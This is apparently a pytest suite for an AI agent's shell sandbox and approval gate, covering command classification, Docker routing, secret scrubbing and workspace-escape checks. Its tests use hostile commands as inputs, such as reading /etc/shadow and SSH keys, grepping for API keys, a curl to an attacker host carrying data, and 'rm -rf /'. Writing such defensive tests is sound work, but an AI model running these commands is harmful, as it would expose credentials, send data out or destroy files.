"""
test_shell.py

ROADMAP §7: tests for security/sandbox.py and tools/builtin/shell.py —
command classification, sandbox routing, Docker/subprocess/inert paths,
approval model, security hardening, and registry integration.

All tests run offline — subprocess and Docker are mocked.
"""

import os
import platform
import subprocess
from unittest.mock import MagicMock, patch

import pytest

import config
from security.capability import (
    CONTAINED,
    UNAVAILABLE,
    UNCONTAINED,
    CommandProfile,
    auto_approved,
    validate_mode,
)
from security.sandbox import (
    HOST_READ,
    INERT,
    SANDBOXED,
    SANDBOXED_NET,
    UNKNOWN,
    SandboxUnavailable,
    _escapes_workspace,
    _is_inert,
    _needs_network,
    _run_docker,
    _run_inert,
    _run_subprocess_fallback,
    _scrubbed_env,
    _venastine_readonly_mount,
    _within,
    classify_command,
    containment_for,
    detect_shell,
    is_docker_available,
    run_sandboxed,
)
from tools.builtin.shell import _shell_approval_check, _shell_approval_notice


# ---------------------------------------------------------------------------
# ---- Fixture: suppress detect_shell subprocess probes ---------------------
# ---------------------------------------------------------------------------

@pytest.fixture(autouse=True)
def _static_shell(monkeypatch):
    """Prevent detect_shell() from spawning real subprocess probes
    during tests that don't explicitly test shell detection."""
    monkeypatch.setattr(config, "SHELL_BINARY", "/bin/bash")


# ===========================================================================
# ---- detect_shell ---------------------------------------------------------
# ===========================================================================

class TestDetectShell:

    def test_config_override(self, monkeypatch):
        monkeypatch.setattr(config, "SHELL_BINARY", "/usr/bin/zsh")
        assert detect_shell() == "/usr/bin/zsh"

    def test_auto_detect_linux(self, monkeypatch):
        monkeypatch.setattr(config, "SHELL_BINARY", "")
        monkeypatch.setattr(platform, "system", lambda: "Linux")
        assert detect_shell() == "bash"

    def test_auto_detect_windows(self, monkeypatch):
        monkeypatch.setattr(config, "SHELL_BINARY", "")
        monkeypatch.setattr(platform, "system", lambda: "Windows")
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            result = detect_shell()
        assert result in ("pwsh", "powershell")


# ===========================================================================
# ---- is_docker_available --------------------------------------------------
# ===========================================================================

class TestDockerAvailable:
    """is_docker_available() is lru_cached for the process (review f41),
    so each case has to clear it -- otherwise the first test's answer
    would be the only one any of them measured."""

    @pytest.fixture(autouse=True)
    def _clear_probe_cache(self):
        # getattr, so removing the cache makes the COUNT test fail with
        # its own message rather than erroring every case in this class
        # on a missing attribute -- an error that masks the assertion is
        # the same "environment could not manifest the failure" shape the
        # revert-check discipline exists to catch.
        clear = getattr(is_docker_available, "cache_clear", lambda: None)
        clear()
        yield
        clear()

    def test_docker_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            assert is_docker_available() is True

    def test_docker_not_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError()
            assert is_docker_available() is False

    def test_docker_timeout(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="docker", timeout=10)
            assert is_docker_available() is False

    def test_the_probe_runs_once_per_process(self):
        """The point of the cache: §18's headless filter calls
        approval_needed(name, {}) for every advertised tool on every
        schema build, and shell's approval_check reaches this -- roughly
        two `docker info` subprocesses per _run(), each up to 10s when
        the daemon is unresponsive."""
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            is_docker_available()
            is_docker_available()
            is_docker_available()
            assert mock_run.call_count == 1


# ===========================================================================
# ---- _is_inert ------------------------------------------------------------
# ===========================================================================

class TestIsInert:

    def test_allowlist_match_no_metacharacters(self):
        assert _is_inert("ls -la") is True
        assert _is_inert("cat file.txt") is True
        assert _is_inert("grep -r pattern .") is True

    def test_not_in_allowlist(self):
        assert _is_inert("python script.py") is False
        assert _is_inert("rm -rf /") is False

    def test_find_and_sort_removed_from_allowlist(self):
        assert _is_inert("find . -name '*.py'") is False
        assert _is_inert("sort data.txt") is False

    def test_metacharacters_reject(self):
        assert _is_inert("ls; rm -rf /") is False
        assert _is_inert("cat file | grep x") is False
        assert _is_inert("echo $HOME") is False
        assert _is_inert("ls > out.txt") is False

    def test_path_qualified_binary_rejected(self):
        """Attacker-planted ./ls or /workspace/ls must NOT be inert."""
        assert _is_inert("./ls") is False
        assert _is_inert("/workspace/ls") is False
        assert _is_inert("/tmp/cat file.txt") is False
        assert _is_inert(".\\ls") is False

    def test_dangerous_flags_rejected(self):
        """Even if a command were in the allowlist, dangerous flags
        would be caught by the denylist."""
        # find is no longer in INERT_COMMANDS, but test the denylist
        # logic by temporarily adding it back
        original = list(config.INERT_COMMANDS)
        config.INERT_COMMANDS.append("find")
        try:
            assert _is_inert("find . -delete") is False
            assert _is_inert("find . -exec rm {} +") is False
            assert _is_inert("find . -name '*.py'") is True  # safe flags OK
        finally:
            config.INERT_COMMANDS[:] = original

    def test_empty_command(self):
        assert _is_inert("") is False
        assert _is_inert("   ") is False


# ===========================================================================
# ---- _needs_network -------------------------------------------------------
# ===========================================================================

class TestNeedsNetwork:

    def test_pip_install(self):
        assert _needs_network("pip install requests") is True

    def test_curl(self):
        assert _needs_network("curl https://example.com") is True

    def test_git_clone(self):
        assert _needs_network("git clone https://github.com/x/y") is True

    def test_no_network_command(self):
        assert _needs_network("ls -la") is False
        assert _needs_network("python script.py") is False

    def test_keyword_in_args_does_not_grant_network(self):
        """grep pip notes.txt must NOT grant network — only the
        command name (first word) is checked."""
        assert _needs_network("grep pip notes.txt") is False
        assert _needs_network("echo git") is False
        assert _needs_network("python script.py # pip") is False
        assert _needs_network("make install-git-hooks") is False

    def test_path_qualified_network_command(self):
        assert _needs_network("/usr/bin/pip install x") is True


# ===========================================================================
# ---- _scrubbed_env --------------------------------------------------------
# ===========================================================================

class TestScrubbedEnv:

    def test_no_api_keys(self, monkeypatch):
        monkeypatch.setenv("OPENAI_API_KEY", "sk-test-123")
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")
        monkeypatch.setenv("MY_SECRET_TOKEN", "abc")
        env = _scrubbed_env()
        assert "OPENAI_API_KEY" not in env
        assert "ANTHROPIC_API_KEY" not in env
        assert "MY_SECRET_TOKEN" not in env

    def test_safe_keys_present(self, monkeypatch):
        monkeypatch.setenv("PATH", "/usr/bin")
        monkeypatch.setenv("HOME", "/home/user")
        env = _scrubbed_env()
        assert "PATH" in env
        assert "HOME" in env


# ===========================================================================
# ---- Backend internals ----------------------------------------------------
# ===========================================================================

class TestBackendInternals:

    def test_run_inert_timeout(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="ls", timeout=60)
            result = _run_inert("ls", "/tmp/ws")
        assert result["return_code"] == -1
        assert "timed out" in result["stderr"]

    def test_run_inert_file_not_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError("no such file")
            result = _run_inert("nonexistent", "/tmp/ws")
        assert result["return_code"] == -1
        assert "not found" in result["stderr"].lower()

    def test_run_inert_truncates_output(self, monkeypatch):
        monkeypatch.setattr(config, "MAX_READ_CHARS", 10)
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="A" * 100, stderr="B" * 100, returncode=0,
            )
            result = _run_inert("ls", "/tmp/ws")
        assert len(result["stdout"]) == 10
        assert len(result["stderr"]) == 10

    def test_run_docker_network_none(self):
        """Verify --network none is passed when network=False."""
        with patch("security.sandbox.subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = ("out", "err")
            mock_proc.returncode = 0
            mock_popen.return_value = mock_proc
            _run_docker("ls", "/tmp/ws", network=False)
        args = mock_popen.call_args[0][0]
        assert "--network" in args
        assert args[args.index("--network") + 1] == "none"

    def test_run_docker_network_allowed(self):
        """Verify --network none is NOT passed when network=True."""
        with patch("security.sandbox.subprocess.Popen") as mock_popen:
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = ("out", "err")
            mock_proc.returncode = 0
            mock_popen.return_value = mock_proc
            _run_docker("pip install x", "/tmp/ws", network=True)
        args = mock_popen.call_args[0][0]
        assert "--network" not in args

    def test_run_docker_timeout_kills_container(self):
        """On timeout, docker kill must be called to stop the container."""
        with patch("security.sandbox.subprocess.Popen") as mock_popen, \
             patch("security.sandbox.subprocess.run") as mock_run:
            mock_proc = MagicMock()
            mock_proc.communicate.side_effect = subprocess.TimeoutExpired(
                cmd="docker", timeout=60,
            )
            mock_popen.return_value = mock_proc
            mock_run.return_value = MagicMock(returncode=0)
            result = _run_docker("sleep 999", "/tmp/ws")
        assert result["return_code"] == -1
        # docker kill should have been called
        kill_calls = [c for c in mock_run.call_args_list
                      if c[0][0][:2] == ["docker", "kill"]]
        assert len(kill_calls) == 1

    def test_run_subprocess_fallback_timeout(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="bash", timeout=60)
            result = _run_subprocess_fallback("sleep 999", "/tmp/ws", "bash")
        assert result["return_code"] == -1
        assert "timed out" in result["stderr"]

    def test_run_subprocess_fallback_shell_not_found(self):
        with patch("security.sandbox.subprocess.run") as mock_run:
            mock_run.side_effect = FileNotFoundError("no bash")
            result = _run_subprocess_fallback("ls", "/tmp/ws", "bash")
        assert result["return_code"] == -1
        assert "not found" in result["stderr"].lower()


# ===========================================================================
# ---- run_sandboxed routing ------------------------------------------------
# ===========================================================================

class TestRunSandboxedRouting:
    """§28: these pass a REAL directory rather than the literal "/tmp/ws"
    they used to. run_sandboxed now creates its workspace (audit #50), so
    a made-up path would be a filesystem side effect outside the repo --
    on Windows the old literal produced a real C:/tmp/ws, which the suite
    then left behind. tmp_path is per-test and torn down."""

    @pytest.fixture
    def ws(self, tmp_path):
        return str(tmp_path)

    def test_inert_uses_light_path(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        with patch("security.sandbox._run_inert") as mock_inert:
            mock_inert.return_value = {"stdout": "ok", "stderr": "", "return_code": 0}
            result = run_sandboxed("ls -la", ws)
        mock_inert.assert_called_once()
        assert result["stdout"] == "ok"

    def test_non_inert_docker_available(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available", return_value=True), \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "docker", "stderr": "", "return_code": 0}
            result = run_sandboxed("python script.py", ws)
        mock_docker.assert_called_once()
        assert result["stdout"] == "docker"

    def test_non_inert_no_docker_fallback_enabled(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", True)
        with patch("security.sandbox.is_docker_available", return_value=False), \
             patch("security.sandbox._run_subprocess_fallback") as mock_fb:
            mock_fb.return_value = {"stdout": "fb", "stderr": "", "return_code": 0}
            result = run_sandboxed("python script.py", ws)
        mock_fb.assert_called_once()
        assert result["stdout"] == "fb"

    def test_non_inert_no_docker_fallback_disabled_raises(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", False)
        with patch("security.sandbox.is_docker_available", return_value=False):
            with pytest.raises(SandboxUnavailable, match="Docker is not available"):
                run_sandboxed("python script.py", ws)

    def test_docker_available_param_overrides_probe(self, monkeypatch, ws):
        """When docker_available is passed explicitly, is_docker_available
        must NOT be called (TOCTOU fix)."""
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available") as mock_probe, \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "", "stderr": "", "return_code": 0}
            run_sandboxed("python x.py", ws, docker_available=True)
        mock_probe.assert_not_called()
        mock_docker.assert_called_once()

    def test_network_false_passed_to_docker(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available", return_value=True), \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "", "stderr": "", "return_code": 0}
            run_sandboxed("python script.py", ws)
        # network should be False for a non-network command
        assert mock_docker.call_args[0][3] is False or mock_docker.call_args[1].get("network") is False

    def test_network_true_for_pip(self, monkeypatch, ws):
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("security.sandbox.is_docker_available", return_value=True), \
             patch("security.sandbox._run_docker") as mock_docker:
            mock_docker.return_value = {"stdout": "", "stderr": "", "return_code": 0}
            run_sandboxed("pip install requests", ws)
        assert mock_docker.call_args[0][3] is True or mock_docker.call_args[1].get("network") is True


# ===========================================================================
# ---- _shell_approval_check ------------------------------------------------
# ===========================================================================

class TestShellApprovalCheck:

    def test_base_approval_true(self, monkeypatch):
        monkeypatch.setattr(config, "ToolApprovals", lambda: type("A", (), {"shell": True})())
        assert _shell_approval_check("shell", {"command": "ls"}) is True

    def test_inert_no_approval(self, monkeypatch):
        monkeypatch.setattr(config, "ToolApprovals", lambda: type("A", (), {"shell": False})())
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls", "cat"])
        assert _shell_approval_check("shell", {"command": "ls -la"}) is False

    def test_docker_no_approval(self, monkeypatch):
        monkeypatch.setattr(config, "ToolApprovals", lambda: type("A", (), {"shell": False})())
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        with patch("tools.builtin.shell.is_docker_available", return_value=True):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is False

    def test_fallback_no_auto_approve_requires_approval(self, monkeypatch):
        monkeypatch.setattr(config, "ToolApprovals", lambda: type("A", (), {"shell": False})())
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", True)
        monkeypatch.setattr(config, "AUTO_APPROVE_SANDBOX_FALLBACK", False)
        with patch("tools.builtin.shell.is_docker_available", return_value=False):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is True

    def test_fallback_auto_approve_no_approval(self, monkeypatch):
        monkeypatch.setattr(config, "ToolApprovals", lambda: type("A", (), {"shell": False})())
        monkeypatch.setattr(config, "INERT_COMMANDS", ["ls"])
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", True)
        monkeypatch.setattr(config, "AUTO_APPROVE_SANDBOX_FALLBACK", True)
        with patch("tools.builtin.shell.is_docker_available", return_value=False):
            assert _shell_approval_check("shell", {"command": "python x.py"}) is False


# ===========================================================================
# ---- Registry integration -------------------------------------------------
# ===========================================================================

class TestRegistryIntegration:

    def test_shell_registered(self):
        from tools.registry import registry
        assert "shell" in registry._tools

    def test_shell_has_approval_check(self):
        from tools.registry import registry
        spec = registry._tools["shell"]
        assert spec.approval_check is not None

    def test_shell_schema_has_command_field(self):
        from tools.registry import registry
        schema = registry._tools["shell"].schema
        assert "command" in schema["input_schema"]["properties"]


# ===========================================================================
# ---- ROADMAP_v2 §28: the classifier and the gate --------------------------
# ===========================================================================


@pytest.fixture
def _tiered(monkeypatch, tmp_path):
    """Shipped §28 posture, with a real empty workspace to measure against.

    ToolApprovals.shell False is the SHIPPED value since §28 -- the mode is
    the gate. Tests that want the ratchet set it back to True explicitly.
    """
    monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", "tiered")
    monkeypatch.setattr(config, "ToolApprovals",
                        lambda: type("A", (), {"shell": False})())
    monkeypatch.setattr(config, "WORKSPACE_DIR", str(tmp_path))
    return str(tmp_path)


def _asks(command, docker=True):
    with patch("tools.builtin.shell.is_docker_available", return_value=docker):
        return _shell_approval_check("shell", {"command": command})


class TestTheArgumentRuleNeverParses:
    """#157 hole 1: `_is_inert` inspected only the first word, so every
    argument was unconstrained on a path that runs on the HOST."""

    def test_an_inert_command_reading_outside_the_workspace_is_asked_about(
            self, _tiered):
        # THE issue's own examples. Read-only, no metacharacters, not
        # path-qualified -- everything the pre-§28 check looked at said
        # harmless, and the file comes back to a model writing a report.
        assert _asks("cat /etc/shadow") is True
        assert _asks("grep -r sk-ant /") is True
        assert _asks("stat /root/.ssh/id_rsa") is True

    def test_the_same_commands_inside_the_workspace_are_not(self, _tiered):
        assert _asks("cat notes.txt") is False
        assert _asks("grep -r sk-ant .") is False
        assert _asks("ls -la") is False

    def test_a_relative_escape_is_caught_too(self, _tiered):
        assert _asks("cat ../../../etc/passwd") is True

    def test_a_flag_is_not_recognised_as_a_flag_it_just_lands_inside(
            self, _tiered):
        """The rule's soundness argument: nothing here knows what a flag
        is. `-la` passes because joining it to the workspace stays inside
        the workspace, which is also why `--file=/etc/x` must be split."""
        assert _within(_tiered, "-la") is True
        assert _within(_tiered, "--color=always") is True
        assert _within(_tiered, "/etc/shadow") is False

    def test_a_path_hidden_after_an_equals_sign_is_caught(self, _tiered):
        """`--file=/etc/x` reads as INSIDE the workspace when taken whole
        -- os.path.join produces a path under the root -- while the path
        it actually names is not. Deleting the `=` clause reopens hole 1
        for every flag that takes a path by assignment."""
        assert _within(_tiered, "--file=/etc/x") is True     # the whole token
        assert _escapes_workspace("grep --file=/etc/x n.txt", _tiered) is True
        assert _asks("grep --file=/etc/x notes.txt") is True

    def test_a_posix_absolute_path_escapes_on_every_platform(self, _tiered):
        assert _escapes_workspace("cat /etc/shadow", _tiered) is True
        assert _escapes_workspace("cat /", _tiered) is True

    @pytest.mark.skipif(platform.system() != "Windows",
                        reason="drive letters and UNC paths are Windows path "
                               "syntax; elsewhere they are ordinary relative "
                               "names and land inside the workspace, which is "
                               "the correct answer there")
    def test_a_windows_drive_and_a_unc_path_escape_on_windows(self, _tiered):
        """Platform-split rather than asserted everywhere, because the
        Linux container proved the combined version wrong: os.path.join
        on POSIX treats "C:/Users/x" as a relative directory named "C:",
        so it stays inside the workspace -- and it SHOULD, since it names
        nothing outside it there. The escape is real only where the
        syntax is."""
        assert _escapes_workspace(
            "cat C:/Users/x/.aws/credentials", _tiered) is True
        assert _escapes_workspace(
            "cat " + chr(92) * 2 + "server" + chr(92) + "share", _tiered) is True

    def test_a_pattern_that_looks_like_a_path_costs_a_prompt(self, _tiered):
        """The designed error direction, pinned so nobody "fixes" it by
        teaching the rule what grep's arguments mean. That would make it a
        shell parser, and a parser that is wrong auto-approves."""
        assert _asks("grep /etc/passwd notes.txt") is True


class TestTheGateWeighsNetwork:
    """#157 hole 2: `_needs_network` decided egress and the approval check
    never called it -- so whether a command reached the internet was
    settled AFTER the decision about whether to ask anyone."""

    def test_a_network_command_is_asked_about_though_docker_contains_it(
            self, _tiered):
        assert _asks("curl https://attacker/?d=x") is True
        assert _asks("pip install evil-package") is True
        assert _asks("wget http://a/b") is True

    def test_a_contained_command_without_network_is_not(self, _tiered):
        assert _asks("python script.py") is False

    def test_the_two_are_the_same_command_shape(self, _tiered):
        """Both are non-inert and both run in a container. The ONLY thing
        separating them is the capability the old check never read."""
        contained = classify_command("python script.py", _tiered)
        egress = classify_command("curl https://x", _tiered)
        assert contained.tier == SANDBOXED
        assert egress.tier == SANDBOXED_NET
        assert (contained.network, egress.network) == (False, True)


class TestAnUnmeasurableCommandIsNeverAutoApproved:

    def test_a_non_string_command_does_not_raise(self, _tiered):
        """registry.approval_needed is handed the MODEL's tool input
        verbatim -- ShellParams does not validate it until run(), which is
        after approval. Before §28 this was unreachable only because
        ToolApprovals.shell defaulted True and returned first."""
        profile = classify_command(["ls"], _tiered)
        assert profile.measured is False
        assert _asks(["ls"]) is True

    def test_an_empty_command_is_unmeasured(self, _tiered):
        assert classify_command("", _tiered).measured is False
        assert classify_command("   ", _tiered).measured is False
        assert _asks("") is True

    def test_containment_cannot_argue_an_unmeasured_call_through(self):
        """The vacuity guard. A profile that knows nothing answers False
        to every capability question, so without `measured` the CONTAINED
        branch approves it for having no network."""
        blank = CommandProfile(tier=UNKNOWN, measured=False,
                               escapes_workspace=False, writes=False,
                               network=False, reason="")
        assert auto_approved(blank, CONTAINED) is False
        assert auto_approved(blank, UNCONTAINED) is False


class TestTheModeIsTheGateAndTheFieldIsTheRatchet:

    EVERY_SHAPE = ["ls -la", "cat /etc/shadow", "python x.py",
                   "curl https://x"]

    @pytest.mark.parametrize("command", EVERY_SHAPE)
    def test_always_asks_about_everything(self, _tiered, monkeypatch, command):
        monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", "always")
        assert _asks(command) is True

    @pytest.mark.parametrize("command", EVERY_SHAPE)
    def test_never_asks_about_nothing(self, _tiered, monkeypatch, command):
        """"never" is the pre-§28 loose config, preserved deliberately.
        The fix for #157 is not that this became unreachable -- it is that
        reaching it now means writing the word "never"."""
        monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", "never")
        assert _asks(command) is False

    def test_tiered_sits_between_them(self, _tiered):
        assert (_asks("ls -la"), _asks("cat /etc/shadow")) == (False, True)

    def test_the_approvals_field_still_forces_always(self, _tiered,
                                                     monkeypatch):
        """D14's one-way ratchet. SHELL_APPROVAL_MODE is the gate, but
        ToolApprovals.shell can only ever tighten it -- and `never` is the
        mode where that has to hold or the field is decorative."""
        monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", "never")
        monkeypatch.setattr(config, "ToolApprovals",
                            lambda: type("A", (), {"shell": True})())
        assert _asks("cat /etc/shadow") is True
        assert _asks("ls -la") is True

    def test_a_bogus_mode_raises_rather_than_defaulting(self, _tiered,
                                                        monkeypatch):
        """Neither direction of a silent default is safe: one asks about
        everything, the other about nothing, and a typo cannot pick."""
        monkeypatch.setattr(config, "SHELL_APPROVAL_MODE", "teired")
        with pytest.raises(ValueError, match="must be one of"):
            _asks("ls -la")

    def test_validate_mode_names_the_setting_it_rejected(self):
        with pytest.raises(ValueError, match="SHELL_APPROVAL_MODE"):
            validate_mode("nope", "config.SHELL_APPROVAL_MODE")

    def test_the_shipped_default_is_tiered(self):
        """Stated rather than left to an incidental pin. The mutation pass
        found this value WAS already pinned -- by a §7 fallback test that
        happens not to set the mode -- which is coverage by accident, and
        would move the moment that test set it explicitly."""
        import importlib
        fresh = importlib.import_module("config")
        assert fresh.SHELL_APPROVAL_MODE == "tiered"
        assert fresh.SHELL_APPROVAL_MODES == ("always", "tiered", "never")

    def test_the_shipped_approvals_field_is_the_ratchet_not_the_gate(self):
        """§28 flipped this to False and the two must move together: with
        it True the tool's check can never lower the answer, because
        approval_needed ORs it with requires_approval and BOTH read this
        field. A future edit setting it back True silently disables
        `tiered` without disabling the setting."""
        assert config.ToolApprovals().shell is False
        assert config.ToolPermissions().shell is False


class TestTheFallbackFlagsStillMeanWhatTheyMeant:
    """§28 replaced the ladder; it must not have quietly dropped the two
    rungs that were actually reachable."""

    def test_fallback_without_auto_approve_still_asks(self, _tiered,
                                                      monkeypatch):
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", True)
        monkeypatch.setattr(config, "AUTO_APPROVE_SANDBOX_FALLBACK", False)
        assert _asks("python x.py", docker=False) is True

    def test_fallback_with_auto_approve_does_not(self, _tiered, monkeypatch):
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", True)
        monkeypatch.setattr(config, "AUTO_APPROVE_SANDBOX_FALLBACK", True)
        assert _asks("python x.py", docker=False) is False

    def test_no_backend_at_all_does_not_ask(self, _tiered, monkeypatch):
        """Not "approved" -- run_sandboxed still raises SandboxUnavailable.
        Asking first spends a human decision on an outcome already fixed,
        which is the burn-a-turn class."""
        monkeypatch.setattr(config, "ALLOW_INSECURE_SANDBOX_FALLBACK", False)
        assert _asks("python x.py", docker=False) is False
        assert containment_for(classify_command("python x.py", _tiered),
                               docker_available=False) == UNAVAILABLE

    def test_an_inert_command_never_probes_docker(self, _tiered):
        """An ordering the pre-§28 ladder had: its inert step returned
        before its Docker step, so `ls` never paid for a `docker info`
        that costs up to its 10s timeout against a wedged daemon."""
        with patch("tools.builtin.shell.is_docker_available") as probe:
            _shell_approval_check("shell", {"command": "ls -la"})
            _shell_approval_check("shell", {"command": "cat /etc/shadow"})
        probe.assert_not_called()


class TestOneClassificationTwoConsumers:

    def test_the_gate_and_the_executor_read_the_same_object(self, _tiered):
        """#157's shape: `_is_inert` was consulted by the approval check
        and again by the router, for two different questions, and neither
        ever saw the other's answer."""
        profile = classify_command("pip install x", _tiered)
        with patch("security.sandbox._run_docker") as docker:
            docker.return_value = {"stdout": "", "stderr": "",
                                   "return_code": 0}
            run_sandboxed("pip install x", _tiered, docker_available=True,
                          profile=profile)
        assert docker.call_args[0][3] is profile.network is True

    def test_run_threads_its_profile_into_the_sandbox(self, _tiered):
        from tools.builtin import shell as shell_mod
        with patch("tools.builtin.shell.is_docker_available",
                   return_value=True), \
             patch("tools.builtin.shell.run_sandboxed") as sandboxed:
            sandboxed.return_value = {"stdout": "", "stderr": "",
                                      "return_code": 0}
            shell_mod.run({"command": "curl https://x"})
        passed = sandboxed.call_args[1]["profile"]
        assert passed.tier == SANDBOXED_NET and passed.network is True

    def test_the_router_sends_a_host_read_down_the_inert_path(self, _tiered):
        """An APPROVED host read must still read the host. `read` outside
        the workspace asks and then reads the real file; routing an
        approved `cat /etc/passwd` into a container would answer a
        different question than the one that was consented to."""
        with patch("security.sandbox._run_inert") as inert:
            inert.return_value = {"stdout": "", "stderr": "",
                                  "return_code": 0}
            run_sandboxed("cat /etc/shadow", _tiered, docker_available=True)
        inert.assert_called_once()


class TestTheApprovalNoticeSaysWhereItRuns:

    def test_it_names_the_host_for_an_inert_read(self, _tiered):
        notice = _shell_approval_notice({"command": "cat /etc/shadow"})
        assert "HOST_READ" in notice and "HOST" in notice

    def test_it_names_the_container_for_a_sandboxed_command(self, _tiered):
        with patch("tools.builtin.shell.is_docker_available",
                   return_value=True):
            notice = _shell_approval_notice({"command": "curl https://x"})
        assert "SANDBOXED_NET" in notice and "Docker" in notice

    def test_the_registry_wires_it_up(self):
        from tools.registry import registry
        assert registry._tools["shell"].approval_notice is not None


class TestTheVenastineMount:

    def test_nothing_is_mounted_when_venastine_is_not_in_the_workspace(
            self, tmp_path):
        """The DEFAULT layout: `.venastine/` resolves from the project
        path while the sandbox mounts AGENT_WORKSPACE (`./workspace`), so
        the two are siblings and Docker cannot reach it at all."""
        assert _venastine_readonly_mount(str(tmp_path)) == []

    def test_nothing_is_mounted_when_the_directory_does_not_exist(
            self, tmp_path):
        """The isdir half. Docker CREATES a missing bind source, as a
        root-owned directory on the host -- and is_trusted() returns True
        while `.venastine/` is absent but False once it exists with no
        store entry, so an unconditional mount would conjure a directory
        and then make the harness prompt the user to trust it."""
        assert not (tmp_path / ".venastine").exists()
        assert _venastine_readonly_mount(str(tmp_path)) == []
        assert not (tmp_path / ".venastine").exists()

    def test_it_is_mounted_read_only_when_it_is_really_there(self, tmp_path):
        (tmp_path / ".venastine").mkdir()
        args = _venastine_readonly_mount(str(tmp_path))
        assert args[0] == "-v"
        assert args[1].endswith(":/workspace/.venastine:ro")

    def test_docker_gets_the_workspace_writable_and_the_subtree_read_only(
            self, tmp_path):
        """/workspace stays writable so builds still work; only the
        subtree is read-only, which Docker resolves by mount depth."""
        (tmp_path / ".venastine").mkdir()
        with patch("security.sandbox.subprocess.Popen") as popen:
            popen.return_value.communicate.return_value = ("", "")
            popen.return_value.returncode = 0
            _run_docker("ls", str(tmp_path))
        argv = popen.call_args[0][0]
        mounts = [argv[i + 1] for i, a in enumerate(argv) if a == "-v"]
        assert any(m.endswith(":/workspace") for m in mounts)
        assert any(m.endswith(":/workspace/.venastine:ro") for m in mounts)

    def test_a_symlinked_venastine_pointing_out_of_the_workspace_is_refused(
            self, tmp_path):
        """What the `nested` half is actually for, found by a surviving
        mutant: os.path.join always produces a nested path, so deleting
        that guard changed nothing any other test could see -- until you
        remember realpath resolves symlinks.

        A `.venastine` symlinked at /etc would otherwise be bind-mounted
        into the container at /workspace/.venastine. Read-only, so it
        could not be modified, but it would put a directory the workspace
        does not contain in front of a model that reads files. This is
        the same escape §14 already found in the trust hash."""
        workspace = tmp_path / "ws"
        outside = tmp_path / "elsewhere"
        workspace.mkdir()
        outside.mkdir()
        try:
            (workspace / ".venastine").symlink_to(
                outside, target_is_directory=True)
        except (OSError, NotImplementedError):    # pragma: no cover
            pytest.skip("platform does not support directory symlinks")
        assert _venastine_readonly_mount(str(workspace)) == []


class TestTheWorkspaceIsCreated:
    """Audit #50."""

    def test_run_sandboxed_creates_a_missing_workspace(self, tmp_path):
        workspace = tmp_path / "does-not-exist-yet"
        assert not workspace.exists()
        with patch("security.sandbox._run_inert") as inert:
            inert.return_value = {"stdout": "", "stderr": "",
                                  "return_code": 0}
            run_sandboxed("ls", str(workspace))
        assert workspace.is_dir()

    def test_a_bad_cwd_is_a_result_not_an_escaping_exception(self, tmp_path):
        """#50's other half, found writing this test. A missing CWD is
        FileNotFoundError on POSIX -- which the handler caught, and then
        misreported as "Command not found" -- but NotADirectoryError on
        Windows, which is an OSError and NOT a FileNotFoundError, so it
        escaped the handler completely.

        `ls` exists and the directory does not, in both backends."""
        missing = str(tmp_path / "nope")
        for result in (_run_inert("ls", missing),
                       _run_subprocess_fallback("ls", missing, "bash")):
            assert result["return_code"] == -1
            assert isinstance(result["stderr"], str) and result["stderr"]


class TestTheTierVocabularyStaysCoherent:

    def test_inert_and_network_command_lists_are_disjoint(self):
        """A tier is ambiguous if a command is in both lists. They are
        disjoint today, and nothing would notice if a later edit added
        `curl` to the inert list -- at which point it runs on the HOST."""
        assert not (set(config.INERT_COMMANDS)
                    & set(config.NETWORK_ALLOWED_COMMANDS))

    def test_every_tier_is_reachable(self, tmp_path):
        seen = {classify_command(c, str(tmp_path)).tier for c in (
            "ls", "cat /etc/shadow", "python x.py", "curl https://x", "")}
